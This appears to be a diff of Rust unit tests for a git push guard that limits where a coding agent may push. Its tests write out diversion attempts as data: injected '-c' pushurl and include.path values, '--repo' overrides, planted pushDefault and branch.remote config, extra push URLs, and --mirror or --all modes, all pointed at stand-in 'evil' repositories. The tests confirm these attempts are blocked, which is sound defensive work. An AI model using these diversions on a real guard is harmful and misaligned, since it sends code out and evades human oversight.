+    /// `which_git()` or a LOUD skip. A silent `return` on a git-less host would
+    /// let CI hide a regression behind a green test, so the skip prints to
+    /// stderr and names the test. (CI has git; the e2e twins hard-panic.)
+    #[track_caller]
+    fn git_or_skip() -> Option<PathBuf> {
+        let git = which_git();
+        if git.is_none() {
+            eprintln!(
+                "SKIP {}: git not found in PATH — guard resolution not exercised",
+                std::panic::Location::caller()
+            );
+        }
+        git
     }
 
     #[test]
@@ -4215,6 +4617,489 @@ mod tests {
     }
 
     #[test]
+    fn push_rule_url_is_pinned_to_the_push_url_not_the_fetch_url() {
+        use crate::config::ResolvedPushRule;
+
+        // origin fetches from one repo but has a divergent `pushurl` pointing
+        // elsewhere. Authorization must be judged against where the push
+        // actually lands (H-10), not the fetch URL the push never touches.
+        let Some((_tmp, repo)) = scratch_repo("main", "git@github.com:navikt/cplt.git") else {
+            return; // no git available
+        };
+        let git = which_git().unwrap();
+        let set_pushurl = std::process::Command::new(&git)
+            .args([
+                "-C",
+                repo.to_str().unwrap(),
+                "remote",
+                "set-url",
+                "--push",
+                "origin",
+                "git@github.com:evil/elsewhere.git",
+            ])
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .env("GIT_CONFIG_NOSYSTEM", "1")
+            .output()
+            .unwrap();
+        assert!(set_pushurl.status.success());
+
+        let rules = vec![ResolvedPushRule {
+            remote: Some("origin".to_string()),
+            branches: vec![],
+            force: false,
+            url: None,
+        }];
+        let resolved = resolve_push_rule_urls(&git, &repo, &rules);
+        assert_eq!(
+            resolved[0].url.as_deref(),
+            Some("github.com/evil/elsewhere"),
+            "the rule must pin the push URL, not the fetch URL"
+        );
+        assert_ne!(resolved[0].url.as_deref(), Some("github.com/navikt/cplt"));
+    }
+
+    // ── H-10: the guard must authorize against the URL the push runs under ──
+    //
+    // The guard probes with its own git (dropping the agent's `-c`) but
+    // `perform_gate_effect` execs the original argv, so any config or flag that
+    // diverts the destination must be caught at the gate. Each test drives
+    // `gate_git` with a rule pinned to the scratch repo's `origin` and asserts
+    // the diverted push is BLOCKED. Setup uses real git; on a git-less host the
+    // test skips explicitly (`which_git` None) rather than passing vacuously —
+    // when git IS present the fixture MUST build (`expect`).
+
+    /// Run a git config/setup command against `repo`, panicking on failure so a
+    /// broken fixture is loud instead of silently skipping the real assertion.
+    fn git_setup(git: &Path, repo: &Path, args: &[&str]) {
+        let ok = std::process::Command::new(git)
+            .args(["-C", repo.to_str().unwrap()])
+            .args(args)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .env("GIT_CONFIG_NOSYSTEM", "1")
+            .output()
+            .expect("git must run")
+            .status
+            .success();
+        assert!(ok, "git setup {args:?} must succeed");
+    }
+
+    /// An allow_push rule pinned to the scratch repo's `origin`, allowing agent/*.
+    fn origin_agent_rule() -> crate::config::ResolvedPushRule {
+        crate::config::ResolvedPushRule {
+            remote: Some("origin".to_string()),
+            branches: vec!["agent/*".to_string()],
+            force: false,
+            url: Some(crate::trust::normalize_remote_url(
+                "git@github.com:navikt/cplt.git",
+            )),
+        }
+    }
+
+    #[test]
+    fn allow_push_blocks_pushurl_injected_via_dash_c() {
+        let Some(git) = git_or_skip() else { return };
+        let (_tmp, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        let dir = repo.to_string_lossy().into_owned();
+        let rules = vec![origin_agent_rule()];
+        // Baseline: a legitimate push to origin agent/x IS allowed.
+        assert!(
+            gate_git(
+                &["-C", &dir, "push", "origin", "agent/x"],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_ok(),
+            "the fixture must allow a legitimate push"
+        );
+        // Attack: `-c remote.origin.pushurl=<evil>` is refused at the gate.
+        assert!(
+            gate_git(
+                &[
+                    "-C",
+                    &dir,
+                    "-c",
+                    "remote.origin.pushurl=https://github.com/evil/x.git",
+                    "push",
+                    "origin",
+                    "agent/x",
+                ],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "a -c pushurl injection must be blocked"
+        );
+    }
+
+    #[test]
+    fn allow_push_blocks_pushdefault_injected_via_dash_c() {
+        let Some(git) = git_or_skip() else { return };
+        let (_tmp, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        let dir = repo.to_string_lossy().into_owned();
+        let rules = vec![origin_agent_rule()];
+        assert!(
+            gate_git(
+                &[
+                    "-C",
+                    &dir,
+                    "-c",
+                    "remote.pushDefault=evil2",
+                    "-c",
+                    "push.default=current",
+                    "push",
+                ],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "-c remote.pushDefault / push.default injection must be blocked"
+        );
+    }
+
+    #[test]
+    fn allow_push_blocks_repo_url_override() {
+        let Some(git) = git_or_skip() else { return };
+        let (_tmp, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        let dir = repo.to_string_lossy().into_owned();
+        let rules = vec![origin_agent_rule()];
+        // No refspec: without the --repo block, remote resolves to origin (which
+        // the rule allows for the current agent/x branch) and the push would be
+        // authorized while `--repo` redirects it to <evil>. The block catches it.
+        assert!(
+            gate_git(
+                &["-C", &dir, "push", "--repo=https://github.com/evil/x.git",],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "git push --repo=<url> must be blocked"
+        );
+    }
+
+    #[test]
+    fn allow_push_blocks_when_a_second_pushurl_diverges() {
+        let Some(git) = git_or_skip() else { return };
+        let (_tmp, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        // origin gains two push URLs: the pinned one plus a divergent one.
+        // `git push` writes to both; `get-url --push` alone would see only the
+        // first. Requiring every URL to match blocks it.
+        git_setup(
+            &git,
+            &repo,
+            &[
+                "remote",
+                "set-url",
+                "--push",
+                "origin",
+                "git@github.com:navikt/cplt.git",
+            ],
+        );
+        git_setup(
+            &git,
+            &repo,
+            &[
+                "remote",
+                "set-url",
+                "--add",
+                "--push",
+                "origin",
+                "https://github.com/evil/x.git",
+            ],
+        );
+        let dir = repo.to_string_lossy().into_owned();
+        let rules = vec![origin_agent_rule()];
+        assert!(
+            gate_git(
+                &["-C", &dir, "push", "origin", "agent/x"],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "a divergent second pushurl must block the push"
+        );
+    }
+
+    #[test]
+    fn allow_push_bare_push_resolves_real_destination_not_origin() {
+        let Some(git) = git_or_skip() else { return };
+        let rules = vec![origin_agent_rule()];
+
+        // Control: with no diversion, bare `git push` resolves to origin and is
+        // allowed — proving the destination resolver returns origin normally.
+        let (_c, control) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        let control_dir = control.to_string_lossy().into_owned();
+        assert!(
+            gate_git(
+                &["-C", &control_dir, "push"],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_ok(),
+            "a bare push with no diversion must resolve to origin and be allowed"
+        );
+
+        // Attack: a planted `remote.pushDefault` (writable .git/config on
+        // Linux/bwrap) diverts a bare push to another remote. Assuming origin
+        // would authorize it; resolving the real destination blocks it.
+        let (_a, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        git_setup(
+            &git,
+            &repo,
+            &["remote", "add", "evil", "https://github.com/evil/x.git"],
+        );
+        git_setup(&git, &repo, &["config", "remote.pushDefault", "evil"]);
+        let dir = repo.to_string_lossy().into_owned();
+        assert!(
+            gate_git(&["-C", &dir, "push"], true, true, false, &rules, Some(&git)).is_err(),
+            "a bare push diverted by remote.pushDefault must be blocked"
+        );
+    }
+
+    #[test]
+    fn allow_push_blocks_include_path_pushurl_injection() {
+        // B1: `-c include.path=<file>` pulls in config that can set
+        // remote.origin.pushurl; the guard's probe (no -c) never sees it.
+        let Some(git) = git_or_skip() else { return };
+        let (_t, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        let dir = repo.to_string_lossy().into_owned();
+        let rules = vec![origin_agent_rule()];
+        assert!(
+            gate_git(
+                &[
+                    "-C",
+                    &dir,
+                    "-c",
+                    "include.path=/tmp/evil.inc",
+                    "push",
+                    "origin",
+                    "agent/x",
+                ],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "-c include.path must be blocked"
+        );
+        assert!(
+            gate_git(
+                &[
+                    "-C",
+                    &dir,
+                    "-c",
+                    "includeIf.onbranch:agent/**.path=/tmp/evil.inc",
+                    "push",
+                    "origin",
+                    "agent/x",
+                ],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "-c includeIf.*.path must be blocked"
+        );
+    }
+
+    #[test]
+    fn allow_push_blocks_bare_push_diverted_by_branch_remote() {
+        // B2: `branch.<b>.remote` diverts a bare push when pushRemote/pushDefault
+        // are unset — git's resolution order includes it before origin.
+        let Some(git) = git_or_skip() else { return };
+        let (_t, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        git_setup(
+            &git,
+            &repo,
+            &["remote", "add", "evil", "https://github.com/evil/x.git"],
+        );
+        git_setup(&git, &repo, &["config", "branch.agent/x.remote", "evil"]);
+        git_setup(
+            &git,
+            &repo,
+            &["config", "branch.agent/x.merge", "refs/heads/agent/x"],
+        );
+        let dir = repo.to_string_lossy().into_owned();
+        let rules = vec![origin_agent_rule()];
+        assert!(
+            gate_git(&["-C", &dir, "push"], true, true, false, &rules, Some(&git)).is_err(),
+            "a bare push diverted by branch.<b>.remote must be blocked"
+        );
+    }
+
+    #[test]
+    fn allow_push_blocks_whole_repo_push_modes() {
+        // B3: --all/--mirror/--tags push refs a branch glob cannot bound. These
+        // need no config and work on any platform.
+        let Some(git) = git_or_skip() else { return };
+        let (_t, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        let dir = repo.to_string_lossy().into_owned();
+        let rules = vec![origin_agent_rule()];
+        for mode in [
+            "--all",
+            "--mirror",
+            "--tags",
+            "--follow-tags",
+            "--branches",
+            "--prune",
+        ] {
+            assert!(
+                gate_git(
+                    &["-C", &dir, "push", mode, "origin"],
+                    true,
+                    true,
+                    false,
+                    &rules,
+                    Some(&git)
+                )
+                .is_err(),
+                "whole-repo push mode {mode} must be blocked"
+            );
+        }
+    }
+
+    #[test]
+    fn allow_push_blocks_second_refspec_outside_glob() {
+        // B3: `git push origin agent/x main` — every refspec must bind, not just
+        // the first. No config needed.
+        let Some(git) = git_or_skip() else { return };
+        let (_t, repo) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        let dir = repo.to_string_lossy().into_owned();
+        let rules = vec![origin_agent_rule()];
+        assert!(
+            gate_git(
+                &["-C", &dir, "push", "origin", "agent/x", "main"],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "a second refspec outside the glob must block the push"
+        );
+    }
+
+    #[test]
+    fn allow_push_blocks_config_driven_norefspec_destinations() {
+        // B3: no-refspec forms whose real destination is set by config.
+        let Some(git) = git_or_skip() else { return };
+        let rules = vec![origin_agent_rule()];
+
+        // push.default=matching pushes every same-named branch, incl. main.
+        let (_a, r1) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        git_setup(&git, &r1, &["config", "push.default", "matching"]);
+        let d1 = r1.to_string_lossy().into_owned();
+        assert!(
+            gate_git(
+                &["-C", &d1, "push", "origin"],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "push.default=matching must block a no-refspec push"
+        );
+
+        // A configured push refspec sends `git push origin` outside the glob.
+        let (_b, r2) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        git_setup(
+            &git,
+            &r2,
+            &["config", "remote.origin.push", "refs/heads/*:refs/heads/*"],
+        );
+        let d2 = r2.to_string_lossy().into_owned();
+        assert!(
+            gate_git(
+                &["-C", &d2, "push", "origin"],
+                true,
+                true,
+                false,
+                &rules,
+                Some(&git)
+            )
+            .is_err(),
+            "a configured remote.push refspec must block a no-refspec push"
+        );
+
+        // push.default=upstream sends the current branch to its merge ref (main).
+        let (_c, r3) = scratch_repo("agent/x", "git@github.com:navikt/cplt.git")
+            .expect("git present: scratch repo must build");
+        git_setup(&git, &r3, &["config", "push.default", "upstream"]);
+        git_setup(
+            &git,
+            &r3,
+            &["config", "branch.agent/x.merge", "refs/heads/main"],
+        );
+        let d3 = r3.to_string_lossy().into_owned();
+        assert!(
+            gate_git(&["-C", &d3, "push"], true, true, false, &rules, Some(&git)).is_err(),
+            "push.default=upstream must block a bare push"
+        );
+    }
+
+    #[test]
+    fn sensitive_config_and_repo_override_detection() {
+        // Pure parsing: no git needed.
+        assert!(
+            injected_sensitive_config_key(&["-c", "remote.origin.pushurl=x", "push"]).is_some()
+        );
+        assert!(injected_sensitive_config_key(&["-c", "push.default=current", "push"]).is_some());
+        assert!(injected_sensitive_config_key(&["-c", "url.x.pushInsteadOf=y", "push"]).is_some());
+        assert!(
+            injected_sensitive_config_key(&["-c", "branch.main.pushRemote=evil", "push"]).is_some()
+        );
+        assert!(
+            injected_sensitive_config_key(&["--config-env", "remote.origin.url=EVIL", "push"])
+                .is_some()
+        );
+        assert!(injected_sensitive_config_key(&["--config-env=push.default=X", "push"]).is_some());
+        // Innocuous config and normal pushes are not caught.
+        assert!(injected_sensitive_config_key(&["-c", "core.pager=cat", "push"]).is_none());
+        assert!(injected_sensitive_config_key(&["push", "origin", "main"]).is_none());
+        assert!(injected_sensitive_config_key(&["-C", "/some/dir", "push"]).is_none());
+
+        assert!(push_has_repo_override(&["--repo=https://x", "main"]));
+        assert!(push_has_repo_override(&["--repo", "https://x"]));
+        assert!(!push_has_repo_override(&["origin", "main"]));
+    }
+
+    #[test]
     fn allow_push_rule_in_gate_git() {
         use crate::config::ResolvedPushRule;
 
@@ -4222,6 +5107,7 @@ mod tests {
             return; // no git available
         };
         let git = which_git().unwrap();
+        make_branches(&git, &repo, &["agent/fix-123"]);
         let dir = repo.to_string_lossy().into_owned();
         let rules = vec![ResolvedPushRule {
             remote: Some("origin".to_string()),
@@ -4350,6 +5236,7 @@ mod tests {
             return; // no git available
         };
         let git = which_git().unwrap();
+        make_branches(&git, &repo, &["feature-branch", "my-feature", "feature"]);
         let dir = repo.to_string_lossy().into_owned();
         assert!(
             gate_git(
@@ -4395,6 +5282,7 @@ mod tests {
             return; // no git available
         };
         let git = which_git().unwrap();
+        make_branches(&git, &repo, &["feature", "develop"]);
         let dir = repo.to_string_lossy().into_owned();
         assert!(
             gate_git(
@@ -4771,6 +5659,7 @@ mod tests {
             return; // no git available
         };
         let git = which_git().unwrap();
+        make_branches(&git, &repo, &["feature"]);
         let dir = repo.to_string_lossy().into_owned();
         assert!(
             gate_git(
@@ -4798,31 +5687,48 @@ mod tests {
             force: true,
             url: None,
         }];
+        // Real repo: a colon-less refspec is resolved with `rev-parse`, so the
+        // branch has to exist the way it would in practice.
+        let Some((_tmp, repo)) = scratch_repo("main", "https://github.com/o/o.git") else {
+            return; // no git available
+        };
+        let git = which_git().unwrap();
+        make_branches(&git, &repo, &["agent/x", "agent/y"]);
+        let dir = repo.to_string_lossy().into_owned();
         // The remote/branch must parse correctly (not be eaten by --force-with-lease).
         assert!(
             gate_git(
-                &["push", "--force-with-lease", "origin", "agent/x"],
+                &[
+                    "-C",
+                    &dir,
+                    "push",
+                    "--force-with-lease",
+                    "origin",
+                    "agent/x"
+                ],
                 true,
                 true,
                 false,
                 &rules,
-                None
+                Some(&git)
             )
             .is_ok()
         );
-        // Branch parsing is correct with the flag present.
-        let (remote, branch) = extract_push_remote_and_branch(
-            &["--force-with-lease", "origin", "agent/x"],
-            None,
-            &[],
-            None,
+        // The flag must not consume the following remote/refspec: the refspec
+        // still resolves to the destination branch.
+        let repo_args = ["-C", dir.as_str()];
+        let dest = |args: &[&str]| match push_target_branches(args, Some(&git), &repo_args) {
+            PushTargets::Branches(b) => b,
+            PushTargets::Unconstrainable => vec!["<unconstrainable>".to_string()],
+        };
+        assert_eq!(
+            dest(&["--force-with-lease", "origin", "agent/x"]),
+            vec!["agent/x".to_string()]
         );
-        assert_eq!(remote.as_deref(), Some("origin"));
-        assert_eq!(branch.as_deref(), Some("agent/x"));
-        let (remote, branch) =
-            extract_push_remote_and_branch(&["--signed", "origin", "agent/y"], None, &[], None);
-        assert_eq!(remote.as_deref(), Some("origin"));
-        assert_eq!(branch.as_deref(), Some("agent/y"));
+        assert_eq!(
+            dest(&["--signed", "origin", "agent/y"]),
+            vec!["agent/y".to_string()]
+        );
     }
 
     // Bug 5: DELETE must be blocked even when input flags are also present.
